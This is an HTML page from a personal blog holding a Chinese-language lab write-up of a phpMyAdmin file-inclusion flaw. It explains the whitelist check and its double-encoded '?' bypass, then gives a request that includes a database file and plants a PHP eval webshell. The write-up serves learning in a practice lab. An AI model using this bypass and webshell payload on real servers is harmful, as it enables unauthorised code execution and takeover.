@@ -1,0 +1,218 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>zkaq-include · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2023-12-31">2023年12月31日</time>
+        
+        
+          <span class="post__readtime">4 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/zkaq/">#zkaq</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">zkaq-include</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <p>说实话现在的状态真的是难受的一批，想睡又睡不着，闹钟浑浑噩噩的，索性从床上爬起来写一下刚学的题吧</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>文件包含</p>
+<p><img src="/../img/Typora/image-20231231040151556.png" alt="image-20231231040151556"></p>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>全局搜include</p>
+<p><img src="/../img/Typora/image-20231231040310552.png" alt="image-20231231040310552"></p>
+<p>代码审计优先级，直接传参大于间接传参</p>
+<p>所以跟进 index.php文件下的include $_REQUEST[‘target’];</p>
+<p><img src="/../img/Typora/image-20231231040459187.png" alt="image-20231231040459187"></p>
+<p>进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(! empty($_REQUEST[&#x27;target&#x27;])								//这里判断传进来的参数是否是空的，若不是返回true</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])						//这里判断参数是否是字符串，若是返回true</span><br><span class="line">    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])		//这里判断参数是否是index开头的，若不是则返回true</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)	//这里判断参数是否在黑名单中</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])			//调用 Core::checkPageValidity($_REQUEST[&#x27;target&#x27;]) 方法，检查目标文件的有效性</span><br></pre></td></tr></table></figure>
+
+<p>跟进分析checkPageValidity</p>
+<p><img src="/../img/Typora/image-20231231041020181.png" alt="image-20231231041020181">&#96;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist = []) 	//这里接收$page与$whitelist两个参数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist = self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">这里表示如果$whitelist为空的话则默认使用$goto_whitelist中的白名单</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">//这里判断$page是否存在以及$page是否为字符串，若存在且是字符串则返回true</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">这里判断$page是否在白名单中，如果在返回true。如果不在则执行后面的代码。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">这里截取变量$page第一个&#x27;?&#x27;之前的字符串并将其赋给$_page</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">这里判断$_是否在白名单中。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">//这里对$page的值进行url解码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>查询数据库所在位置</p>
+<p><img src="/../img/Typora/image-20231231042805162.png" alt="image-20231231042805162"></p>
+<p>新建一个含有一句话木马的表</p>
+<p><img src="/../img/Typora/image-20231231043026544.png" alt="image-20231231043026544"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ogazcjj5.ia.aqlab.cn/MySQL/data/bdyz/rce.frm</span><br><span class="line"></span><br><span class="line">http://ogazcjj5.ia.aqlab.cn/lfi/phpmyadmin/?target=db_datadict.php%253F/../../../../MySQL/data/us/ta.frm&amp;8=file_put_contents(&#x27;2.php&#x27;,&#x27;&lt;?php eval($_REQUEST[8]);?&gt;&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231231051009059.png" alt="image-20231231051009059"></p>
+<p>连接成功</p>
+<p><img src="/../img/Typora/image-20231231051238690.png" alt="image-20231231051238690"></p>
+<p>找到flag</p>
+<p><img src="/../img/Typora/image-20231231052702812.png" alt="image-20231231052702812"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-06">2024·03·06</time>
+          <a class="related__link" href="/2024/03/06/%E5%9F%BA%E7%A1%80/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-05">2024·03·05</time>
+          <a class="related__link" href="/2024/03/05/%E5%9F%BA%E7%A1%80/SSIT%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-03-04">2024·03·04</time>
+          <a class="related__link" href="/2024/03/04/%E5%9F%BA%E7%A1%80/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">zkaq-代码执行</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/01/21/%E5%9F%BA%E7%A1%80/zkaqXSS/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">zkaq—xss</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2023/12/26/%E5%9F%BA%E7%A1%80/C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">C语言笔记</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
